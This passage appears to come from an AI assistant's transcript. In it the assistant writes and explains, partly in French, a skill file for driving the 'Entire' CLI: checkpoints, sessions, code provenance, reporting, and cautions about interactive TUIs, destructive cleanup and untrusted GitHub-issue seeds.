carries transcript bytes. If you need both, make two calls.

## Sessions

```bash
entire session current            # active session for this worktree
entire session list               # across all worktrees
entire session info <id> --json
entire session stop               # interactive without an id
entire session resume <branch>
entire session adopt <id> --from ../other-worktree
```

## Token usage

```bash
entire checkpoint tokens <id>                      # usage + optimization advice
entire checkpoint tokens <id> --agent-brief         # compact next-step guidance for agents
entire checkpoint tokens <id> --compare <baseline>  # qualify a reduction
entire session tokens <id>
entire tokens profile                               # aggregate across checkpoints (labs)
```

`--agent-brief` is the right output mode when *you* are the consumer.

## Reporting

```bash
entire recap --week --view both     # day (default) | week | month | 90
entire recap --static               # non-interactive — required in agent context
entire activity                     # overview + recent sessions
entire activity --commits           # recent commits instead
entire dispatch --since 7d          # written summary of recent agent work
entire dispatch --local --all-branches
```

`recap` opens an interactive TUI by default. **Always pass `--static`** when you
are not a human at a terminal.

## Labs (experimental — surface may change)

```bash
entire review                       # multi-agent review of the branch, judge consolidates
entire review --list                # configured profiles
entire investigate <seed-doc>       # multi-agent investigation to quorum
entire investigate show <run-id>
entire import claude-code           # import Claude Code transcripts as read-only history
```

`entire review` is user-triggered and spawns real agents. Do not launch it on your
own initiative — surface it as a suggestion and let the user decide.

## Traps

**Interactive by default.** `recap`, `checkpoint search` with no query,
`session stop` with no id, `review --configure`, and `experts --tui` open TUIs
that will hang a non-interactive session. Pass `--static`, `--json`, or an explicit
argument. `ACCESSIBLE=1` in the environment swaps TUIs for plain-text prompts and
is a useful fallback.

**`entire clean` deletes work.** It removes session state and shadow branches.
Always `--dry-run` first; treat `--force --all` as destructive and confirm with the
user before running it.

**`entire investigate --issue-link` needs `--allow-untrusted-seed`** to run
non-interactively, because a GitHub issue is attacker-influenced content and the
agents run with permission bypass. That guard exists for a reason — do not add the
flag reflexively to silence the refusal.

**Pushes carry a second branch.** `git push` also pushes `entire/checkpoints/v1`.
A remote `HEAD` may resolve to that branch rather than `main`, which makes web UIs
appear to show "nothing" for the project. Check with `git ls-remote origin`.

**`entire api` is a real authenticated call.** `--to core` hits the control plane,
`--to cell` your home cell. Method defaults to GET, but becomes POST as soon as a
field or body is supplied — an accidental `-F` turns a read into a write. Path
placeholders `{owner}`, `{repo}`, `{repo_id}` are filled from the origin remote.

## Setup and repair

```bash
entire enable --agent claude-code   # non-interactive hook install
entire enable --agent-help-skill    # install Entire's own official agent-help skill
entire agent list                   # installed + available agents
entire status --detailed --json
entire doctor                       # diagnose stuck sessions, disconnected metadata branches
entire doctor --force               # auto-fix without prompting
entire configure --telemetry=false
```

`doctor` covers three known failure modes: metadata branches that share no common
ancestor with their remote, Codex hooks missing a trust hash, and sessions stuck in
ACTIVE (idle > 1h) or ENDED (uncondensed) phase.

Note that Entire ships an official `--agent-help-skill`. If a repo installs it,
prefer it as the authority for that repo and keep this skill for cross-repo habits.

---

Authored against **Entire CLI 0.8.42**. Command names are the stable surface; verify
flags with `entire agent-help <command>` rather than trusting this file.

content.text:
Confirmé : `--agent-help-skill` **est** booléen. L'affichage bizarre vient de la convention backtick de cobra — le \`entire agent-help\` de sa description a été extrait comme nom d'argument et retiré du texte. L'usage que j'ai documenté est correct.

La skill est créée et déjà enregistrée par le runtime :

**`~/.claude/skills/entire/SKILL.md`** — user-globale, donc active sur tous tes projets.

## Le choix de conception

Le CLI expose `entire agent-help`, décrit comme « machine-readable usage for coding agents (always matches the installed CLI) ». Autrement dit, Entire résout déjà le problème de la documentation qui dérive.

Écrire un catalogue de flags dans la skill aurait donc été activement nuisible : figé à la 0.8.42, il aurait contredit le binaire dès la version suivante, et un agent aurait fait confiance au fichier plutôt qu'à la source de vérité. La skill pose donc comme règle n°1 d'interroger `entire agent-help <command>` avant toute invocation non triviale, et se concentre sur ce qui ne bouge pas : **quelle commande résout quel problème**, et les pièges.

## Ce qu'elle contient

- **Règle 2 : ne jamais demander le repo.** Le CLI l'auto-détecte depuis `origin` et l'écrit lui-même en pied de chaque sortie ; `--repo` ne sert qu'à viser un *autre* repo.
- **Provenance** — `why`, `blame`, `experts`. Ce sont les commandes à vraie valeur ajoutée : elles relient une ligne de code au *prompt* qui l'a produite, ce que git seul ne peut pas faire.
- **Pièges**, la partie que le `--help` ne dit pas :
  - `recap`, `checkpoint search` sans requête, `session stop` sans id et `experts --tui` ouvrent des TUI qui **bloqueraient** une session non interactive → `--static` / `--json`, ou `ACCESSIBLE=1`.
  - `entire api` bascule GET → POST dès qu'on passe un `-F` : un flag de trop transforme une lecture en écriture.
  - `entire clean --force --all` détruit des données de session.
  - `investigate --allow-untrusted-seed` existe parce qu'une issue GitHub est du contenu influençable par un tiers alors que les agents tournent en bypass de permissions — à ne pas ajouter par réflexe pour faire taire le refus.
  - Le push embarque `entire/checkpoints/v1`, ce qui explique le `HEAD` distant de ton dépôt.

## Deux points à ta main

`entire review` lance de vrais agents en parallèle et c'est facturé — la skill demande explicitement de le proposer plutôt que de le déclencher seule.

---
name: entire-cli
description: Drive the Entire CLI (entire) for checkpoints, agent sessions, code provenance, and multi-agent review. Use when the user mentions Entire, checkpoints, session tracking, "entire why/blame/experts", agent activity recaps, or when a repo contains .entire/ and you need to inspect or manage tracked agent work.
origin: local-cli-analysis
tools: Bash, Read, Grep, Glob
---

# Entire CLI

Entire records agent work as **checkpoints** — persistent records tied to commits —
and tracks **sessions** across worktrees. This skill covers driving its CLI.

> Entire also ships its own managed skill named `entire`
> (`.claude/skills/entire/SKILL.md`, marked `ENTIRE-MANAGED`), installed by
> `entire enable --agent-help-skill`. That file is regenerated by the tooling —
> never hand-edit it. This skill is named `entire-cli` so the two coexist instead
> of shadowing each other: the managed one states the core rule, this one adds the
> workflows and traps.

## Rule 1: the CLI documents itself — never guess flags

Entire ships a machine-readable help surface that always matches the installed binary:

```bash
entire agent-help                      # command map + when to use each
entire agent-help <command>            # exact flags for the installed version
entire agent-help <command> <sub>      # drill further
entire agent-help <command> --json     # structured output
```

**Read it before composing any non-trivial invocation.** The CLI evolves quickly; a
flag list memorised in a skill file goes stale, the self-help does not. This file
therefore documents *which command solves which problem* and the traps — command
names are stable, flags are not.

If a command errors on an unknown flag, do not guess a variant. Run
`entire agent-help <command>` and read the real surface.

## Rule 2: never ask the user for the repo

Entire auto-detects the repository from the git `origin` remote. You are already
inside it.

- Pass `--repo` **only** to target a *different* repo than the current one.
- Repo slugs take several forms: `gh/owner/repo` (GitHub-backed), `et/proj/repo`
  (Entire-native), plain `owner/repo`, or a ULID.

`entire agent-help` prints the detected repo in its footer — use that to confirm
which repo you are acting on before any write operation.

## Command map

| Need | Command |
|---|---|
| What did the agent do here? | `checkpoint explain`, `checkpoint list` |
| Find past work by meaning | `checkpoint search` |
| Who/what produced this line? | `why`, `blame` |
| Which agent knows this area? | `experts` |
| Session state, stop, resume | `session` |
| Activity summary | `recap`, `activity` |
| Written summary of recent work | `dispatch` |
| Is Entire on? | `status`, `enable`, `disable` |
| Something is stuck | `doctor` |
| Remove local session data | `clean` |
| Settings (telemetry, hooks, backend) | `configure` |
| Install agent hooks | `agent add/remove/list` |
| Raw API call | `api` |
| Orgs / projects / repos / access | `org`, `project`, `repo`, `grant` |
| Auth | `login`, `logout`, `auth` |
| Experimental workflows | `labs` |

## Provenance — the highest-value commands

These answer questions plain git cannot, because they join commits to the prompts
and sessions that produced them.

```bash
entire why <file>:42            # commit + checkpoint + prompt + session behind a line
entire blame <file>:12-20       # git-blame enriched with checkpoint metadata
entire blame <file> --long      # adds agent, model, author, session columns
entire experts <scope-or-query> # rank agent provenance for a code scope
entire experts --staged         # use staged paths as the scope
```

All three accept `--json`. Reach for `entire why` before speculating about *why*
code looks a certain way — it often returns the literal prompt that produced it.

## Search

```bash
entire checkpoint search "fix login"          # hybrid semantic + keyword, current repo
entire checkpoint search "..." --all-repos    # widen scope
entire checkpoint search "..." --code         # search code content instead
entire checkpoint search "..." --json --limit 20
```

Queries support inline filters: `author:<name>`, `date:<week|month>`,
`branch:<name>`, `repo:<owner/name>`, `repo:*`.

Requires `entire login` (GitHub device flow). Run with no arguments for an
interactive picker — **avoid that in an agent context**, pass a query and `--json`.

## Reading a checkpoint

```bash
entire checkpoint list                      # checkpoints on the current branch
entire checkpoint explain <id|sha>          # auto-detects checkpoint ID vs commit SHA
entire checkpoint explain <id> --short      # summary only
entire checkpoint explain <id> --json       # metadata only; never embeds transcript bytes
entire checkpoint explain <id> --transcript # stream raw JSONL transcript to stdout
```

Checkpoint IDs may be abbreviated to any unambiguous prefix. A commit carrying an
`Entire-Checkpoint:` trailer resolves as a positional target too.

`--json` and `--transcript` are deliberately separate surfaces: metadata never
carries transcript bytes. If you need both, make two calls.

## Sessions

```bash
entire session current            # active session for this worktree
entire session list               # across all worktrees
entire session info <id> --json
entire session stop               # interactive without an id
entire session resume <branch>
entire session adopt <id> --from ../other-worktree
```

## Token usage

```bash
entire checkpoint tokens <id>                       # usage + optimization advice
entire checkpoint tokens <id> --agent-brief         # compact next-step guidance for agents
entire checkpoint tokens <id> --compare <baseline>  # qualify a reduction
entire session tokens <id>
entire tokens profile                               # aggregate across checkpoints (labs)
```

`--agent-brief` is the right output mode when *you* are the consumer.

## Reporting

```bash
entire recap --week --view both     # day (default) | week | month | 90
entire recap --static               # non-interactive — required in agent context
entire activity                     # overview + recent sessions
entire activity --commits           # recent commits instead
entire dispatch --since 7d          # written summary of recent agent work
entire dispatch --local --all-branches
```

`recap` opens an interactive TUI by default. **Always pass `--static`** when you
are not a human at a terminal.

## Labs (experimental — surface may change)

```bash
entire review                       # multi-agent review of the branch, judge consolidates
entire review --list                # configured profiles
entire investigate <seed-doc>       # multi-agent investigation to quorum
entire investigate show <run-id>
entire import claude-code           # import Claude Code transcripts as read-only history
```

`entire review` is user-triggered and spawns real agents. Do not launch it on your
own initiative — surface it as a suggestion and let the user decide.

## Traps

**Interactive by default.** `recap`, `checkpoint search` with no query,
`session stop` with no id, `review --configure`, and `experts --tui` open TUIs
that will hang a non-interactive session. Pass `--static`, `--json`, or an explicit
argument. `ACCESSIBLE=1` in the environment swaps TUIs for plain-text prompts and
is a useful fallback.

**`entire clean` deletes work.** It removes session state and shadow branches.
Always `--dry-run` first; treat `--force --all` as destructive and confirm with the
user before running it.

**`entire investigate --issue-link` needs `--allow-untrusted-seed`** to run
non-interactively, because a GitHub issue is attacker-influenced content and the
agents run with permission bypass. That guard exists for a reason — do not add the
flag reflexively to silence the refusal.

**Pushes carry a second branch.** `git push` also pushes `entire/checkpoints/v1`.
A remote `HEAD` may resolve to that branch rather than `main`, which makes web UIs
appear to show "nothing" for the project. Check with `git ls-remote origin`.

**`entire api` is a real authenticated call.** `--to core` hits the control plane,
`--to cell` your home cell. Method defaults to GET, but becomes POST as soon as a
field or body is supplied — an accidental `-F` turns a read into a write. Path
placeholders `{owner}`, `{repo}`, `{repo_id}` are filled from the origin remote.

## Setup and repair

```bash
entire enable --agent claude-code   # non-interactive hook install
entire enable --agent-help-skill    # install Entire's own managed skill (boolean flag)
entire agent list                   # installed + available agents
entire status --detailed --json
entire doctor                       # diagnose stuck sessions, disconnected metadata branches
entire doctor --force               # auto-fix without prompting
entire configure --telemetry=false
```

`doctor` covers three known failure modes: metadata branches that share no common
ancestor with their remote, Codex hooks missing a trust hash, and sessions stuck in
ACTIVE (idle > 1h) or ENDED (uncondensed) phase.

---

Authored against **Entire CLI 0.8.42**. Command names are the stable surface; verify
flags with `entire agent-help <command>` rather than trusting this file.
